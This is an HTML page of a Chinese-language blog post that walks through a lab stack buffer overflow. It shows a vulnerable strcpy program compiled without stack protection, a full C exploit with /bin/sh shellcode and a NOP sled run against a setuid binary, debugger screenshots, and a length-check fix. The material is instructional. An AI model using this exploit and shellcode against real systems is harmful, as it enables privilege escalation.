@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  <title>Stackoverflow | Song Li(Seanlee) Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。">
+<meta name="keywords" content="IS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stackoverflow">
+<meta property="og:url" content="http://blog.songli.us/2015/03/05/Stackoverflow/index.html">
+<meta property="og:site_name" content="Song Li(Seanlee) Blog">
+<meta property="og:description" content="说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/2.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/5.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/8.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/3.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/4.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/1.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/6.png">
+<meta property="og:image" content="http://blog.songli.us/image/Stackoverflow/9.png">
+<meta property="og:updated_time" content="2018-10-02T16:45:23.809Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Stackoverflow">
+<meta name="twitter:description" content="说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。">
+<meta name="twitter:image" content="http://blog.songli.us/image/Stackoverflow/2.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Song Li(Seanlee) Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/image/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+
+  
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/image/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Song Li</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">A Programmer&#39;s Life</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">home</a></li>
+                        
+                            <li><a href="/archives/">archives</a></li>
+                        
+                            <li><a href="/tags/">tags</a></li>
+                        
+                            <li><a href="/download/">download</a></li>
+                        
+                            <li><a href="/profile/">about</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="/lisong1013@gmail.com" title="Email"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ADV-Programming/">ADV Programming</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IS/">IS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IT/">IT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Fingerprinting/">Machine Fingerprinting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Notes/">Notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Piano-sheet/">Piano sheet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Play/">Play</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/">leetcode</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Coding</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Song Li</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/image/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Song Li</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">A Programmer&#39;s Life</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">home</a></li>
+                
+                    <li><a href="/archives/">archives</a></li>
+                
+                    <li><a href="/tags/">tags</a></li>
+                
+                    <li><a href="/download/">download</a></li>
+                
+                    <li><a href="/profile/">about</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="/lisong1013@gmail.com" title="Email"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Stackoverflow" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/03/05/Stackoverflow/" class="article-date">
+      <time datetime="2015-03-06T00:28:28.000Z" itemprop="datePublished">2015-03-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Stackoverflow
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/IS/">IS</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IS/">IS</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。<br><a id="more"></a><br>当然最开始要放上来的还是有漏洞的程序。为了节省篇幅，仅仅把主函数粘上来，也就是我们有漏洞的地方。程序如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"common.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uid_t</span> userid = getuid();</span><br><span class="line">  <span class="keyword">int</span> printing = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> search_buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(search_buffer, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    search_buffer[<span class="number">0</span>] = <span class="string">'\0'</span>; <span class="comment">// Null byte - empty string</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fd = open(NOTE_FILE, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    fatal(<span class="string">"Problem opening file in main()"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(printing) &#123;</span><br><span class="line">    printing = print_notes(fd, userid, search_buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"--------[ END OF DATA ]--------\n"</span>);</span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>##程序攻击##</p>
+<p>学过信息安全的大约都能看出来，中间strcpy函数复制的时候没有检查输入参数的边界。因此只要输入的稍微长点的参数，就会产生溢出。接下来我们就在ubuntu 下做一下这个实验吧。<br>先说一下基本原理吧。在每个函数的特定位置，存放着该函数的返回地址。这个返回地址可能会被有溢出漏洞的数组，函数覆盖。如果这个返回地址被用新的地址覆盖了，而且新的地址指向我们另外一段程序，那样的话我们就可以通过这个程序获得更高的权限了。<br>第一步，编译程序。截图如下：<br><img src="/image/Stackoverflow/2.png" alt="com.png"><br>编译这一步必须做对了。不然就不能继续下去。下面我解释一下这几个有关参数：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o searchnote -z execstack -fno-<span class="built_in">stack</span>-protector -g searchnote.c</span><br></pre></td></tr></table></figure></p>
+<p>这句代码是这样的。在现代编译器中，gcc会对很多安全问题进行处理。比方说禁止数据堆栈区的程序运行，缓冲区溢出处理等等。一旦gcc处理了这些问题，我们的缓冲区溢出攻击也就没办法继续下去了。<br>这里 -z execstack 就是用来告诉编译器栈上的程序是可以运行的。 -fno-stack-protector 是用来禁用堆栈溢出保护的。这样下去之后，就可以运行下一步了。<br><strong>PS:gcc4.6以上好像这两句代码不好使了，堆栈保护一直关不掉。最后我只好使用gdb继续进行试验了</strong><br>第二步，设计我们的攻击程序。程序代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"</span></span><br><span class="line"><span class="string">"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"</span></span><br><span class="line"><span class="string">"\xe1\xcd\x80"</span></span><br><span class="line">;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">getESP</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"movl %ESP,%EAX"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// This code builds the malicious input required to trigger our buffer overflow,and then</span></span><br><span class="line"><span class="comment">// invokes the searchnote binary with it. Once finished, this code should yield a root shell.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *command, *buffer;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line">addr = getESP() + OFFSET;</span><br><span class="line">command = <span class="built_in">calloc</span>(<span class="number">2000</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Using Offset: 0x%x\nShellcode Size:%d\n"</span>,addr,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="built_in">strcpy</span>(command, <span class="string">"./searchnote \'"</span>); <span class="comment">// start command buffer</span></span><br><span class="line">buffer = command + <span class="built_in">strlen</span>(command); <span class="comment">// set buffer at the end</span></span><br><span class="line"><span class="comment">// fill buffer with enough copies of an address within the NOP sled to overwrite the return address</span></span><br><span class="line"><span class="built_in">memset</span>(buffer,<span class="number">0x90</span>,<span class="number">1024</span>);</span><br><span class="line"><span class="comment">// append suitably long NOP sled to give a large enough target for the previous part to work reliably</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">200</span>;i += <span class="number">4</span>)&#123;</span><br><span class="line">buffer[i] = addr &amp; <span class="number">0x000000ff</span>;</span><br><span class="line">buffer[i + <span class="number">1</span>] = (addr &amp; <span class="number">0x0000ff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">buffer[i + <span class="number">2</span>] = (addr &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">buffer[i + <span class="number">3</span>] = (addr &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(buffer + <span class="number">900</span>,shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// append our shellcode to buffer</span></span><br><span class="line"><span class="built_in">strcat</span>(command, <span class="string">"\'"</span>);</span><br><span class="line">system(command); <span class="comment">// run exploit</span></span><br><span class="line"><span class="built_in">free</span>(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键部分在这里<br><img src="/image/Stackoverflow/5.png" alt="code1.png"><br>下面我解释一下这个代码。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">getESP</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"movl %ESP,%EAX"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line">addr = getESP() + OFFSET;</span><br></pre></td></tr></table></figure></p>
+<p>这部分代码，我们用来得到当前堆栈的起始位置。OFFSET是我们猜测的偏移量。addr就是我们的shellcode的大概位置了。我们只要把shellcode附着在buffer的后边，然后让这个addr指向shellcode大概的前边就可以。这里我们用到一个东西叫做NOP sled。<br>NOP sled就是当程序指针指导NOP的时候，它会继续往下寻找可执行程序。一直“滑”到可执行的程序位置。这样的话我们把shellcode的前边用0x90填充，在一大堆0x90(NOP)的包围下，addr只要指向shellcode前边的某个NOP即可，程序指针就会滑下去，滑到我们的shellcode然后执行。</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//<span class="built_in"> fill </span>buffer with enough copies of an address within the NOP sled to overwrite the<span class="built_in"> return </span>address</span><br><span class="line">memset(buffer,0x90,1024);</span><br></pre></td></tr></table></figure>
+<p>这一段代码就是用0x90来填充buffer，长度为1024.</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int i<span class="comment">;</span></span><br><span class="line">for(i = <span class="number">0</span><span class="comment">;i &lt; 200;i += 4)&#123;</span></span><br><span class="line"><span class="keyword">buffer[i] </span>= <span class="keyword">addr </span>&amp; <span class="number">0x000000ff</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">buffer[i </span>+ <span class="number">1</span>] = (<span class="keyword">addr </span>&amp; <span class="number">0x0000ff00</span>) &gt;&gt; <span class="number">8</span><span class="comment">; </span></span><br><span class="line"><span class="keyword">buffer[i </span>+ <span class="number">2</span>] = (<span class="keyword">addr </span>&amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span><span class="comment">;</span></span><br><span class="line"><span class="keyword">buffer[i </span>+ <span class="number">3</span>] = (<span class="keyword">addr </span>&amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">memcpy(<span class="keyword">buffer </span>+ <span class="number">900</span>,<span class="keyword">shellcode,sizeof(shellcode));</span></span><br></pre></td></tr></table></figure>
+<p>这一部分是这样，因为我们不确定存着函数返回地址的地址，我们就暴力的从buffer的开始，不断的用addr来填充所有的部分。一直填充到200个为止。由于返回地址的对齐，所以中间一定能覆盖到返回地址，指向addr。然后返回到这个addr之后一直沿着0x90滑下去。滑到shellcode就成功了。</p>
+<p>下边我们看一下具体攻击的情况。首先如下图：</p>
+<p><img src="/image/Stackoverflow/8.png" alt="setuid.png"><br>chmod就是另外一个技术，所谓setuid，也就是让别的用户运行这个程序享有某些权限。这里我们这么写之后，用另外一个新建用户”eve”执行程序，也就有了和程序创建用户一样的效果。<br>我们用gdb对searchnote进行一下调试，观察一下内存的变化过程。</p>
+<p><img src="/image/Stackoverflow/3.png" alt="stack1.png"><br>这里我们看到，在运行strcpy之前，我们的内存数据是正常的。这个时候main的返回地址应该是在0xbffff250左右。具体哪个已经不重要了。因为在缓冲区覆盖完成之后，可能的位置已经全变成指向shellcode的位置了。在上图的下方，大片的地址已经被我们得到的addr地址，也就是指向我们shellcode的地址覆盖。这个地址是0xbffff45c。其实可以看出来我们猜测的偏移量的大了。大约在0xbffff2f0就可以写入了。但是由于我们中间全用0x90填充，返回指针一直会滑到我们的shellcode的位置。</p>
+<p><img src="/image/Stackoverflow/4.png" alt="stack2.png"><br>这张图片揭示了我们shellcode附近的情况。0xbffff45c也就是程序返回执行的位置，在前边隐去了。程序指针会顺着NOP sled 一直滑到shellcode复婚，也就是0xbffff5a0的位置。开始执行shellcode。</p>
+<p><img src="/image/Stackoverflow/1.png" alt="result.png"><br>运行完shellcode就是上边这个结果了。<br><strong>PS:预期结果应该是获取root权限。但是由于程序创建者没有这个权限，同时ubuntu系统有bash的保护机制，导致没能获取root权限。这里我们仅仅获取了程序创建者的权限，但是这已经证明了我们成功的进行了缓冲区溢出攻击</strong></p>
+<p>##程序漏洞修补##<br>程序修补比较简单，只要检查输入长度然后加以判断就好。关键代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stack_frame</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stack_frame</span>* <span class="title">next</span>;</span></span><br><span class="line">  <span class="keyword">void</span>* ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> ** <span class="title">get_addr_of_ret_addr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* x86/gcc-specific: this tells gcc that the fp</span></span><br><span class="line"><span class="comment">     variable should be set to the %ebp register</span></span><br><span class="line"><span class="comment">     which keeps the frame pointer */</span></span><br><span class="line">  <span class="function"><span class="keyword">register</span> struct stack_frame* fp <span class="title">asm</span><span class="params">(<span class="string">"ebp"</span>)</span></span>;</span><br><span class="line">  <span class="comment">// the rest just walks through the linked list</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stack_frame</span>* <span class="title">frame</span> = <span class="title">fp</span>;</span> <span class="comment">// This is the stack frame of get_ebp</span></span><br><span class="line">  <span class="comment">// Move down the stack to the stack frame which called get_ebp</span></span><br><span class="line">  frame = frame-&gt;next;</span><br><span class="line">  <span class="comment">// We want to return the *address* of the retur address </span></span><br><span class="line">  <span class="keyword">return</span> &amp;frame-&gt;ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上边这些代码的作用是获得当前函数的返回地址的存储地址。</p>
+<p><img src="/image/Stackoverflow/6.png" alt="code_fix.png"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> search_buffer[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">void</span> ** addr;</span><br><span class="line">addr = get_addr_of_ret_addr();</span><br><span class="line"><span class="keyword">int</span> gap = (<span class="keyword">char</span> *)addr - search_buffer;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,<span class="built_in">strlen</span>(argv[<span class="number">1</span>])); </span><br><span class="line"><span class="keyword">if</span>(gap &lt;= <span class="built_in">strlen</span>(argv[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The args is too long\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="built_in">strcpy</span>(search_buffer, argv[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  search_buffer[<span class="number">0</span>] = <span class="string">'\0'</span>; <span class="comment">// Null byte - empty string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上边这些代码首先使用get_addr_of_ret_addr()获取当前程序返回地址的存放地址，然后用gap来存放返回地址和search_buffer的空间大小。如果输入的长度大于该长度，就输出提示，同时程序停止。</p>
+<p>修补后的实验结果如下：<br><img src="/image/Stackoverflow/9.png" alt="result.png"><br>修补程序成功。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2015/03/05/Stackoverflow/">Stackoverflow</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">Song Li</a></p>
+        <p><span>Created:</span>2015-03-05, 19:28:28</p>
+        <p><span>Updated:</span>2018-10-02, 12:45:23</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2015/03/05/Stackoverflow/" title="Stackoverflow">http://blog.songli.us/2015/03/05/Stackoverflow/</a>
+            <span class="copy-path" data-clipboard-text="From http://blog.songli.us/2015/03/05/Stackoverflow/　　By Song Li" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2015/03/06/2048/">
+                    2048
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2015/02/23/U8681U7fa4U7b97U6cd5U53caU5176U5728U5217U8f66U89e3U4f53U987aU5e8fU7f16U6392U7684U5e94U7528/">
+                    蚁群算法及其在列车解体顺序编排的应用
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+<script>
+    var valueHide = "Hide";
+    var valueShow = "Show";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <li id="bds_twi"><a href="#" class="bds_twi" data-cmd="twi" title="分享到推特"></a></li>
+            <li id="bds_tsina"><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a></li>
+            <li id="bds_sqq"><a href="#" class="bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a></li>
+            <li id="bds_copy"><a href="#" class="bds_copy" data-cmd="copy" title="复制网址"></a></li>
+            <li id="bds_mail"><a href="#" class="bds_mail" data-cmd="mail" title="通过邮件分享"></a></li>
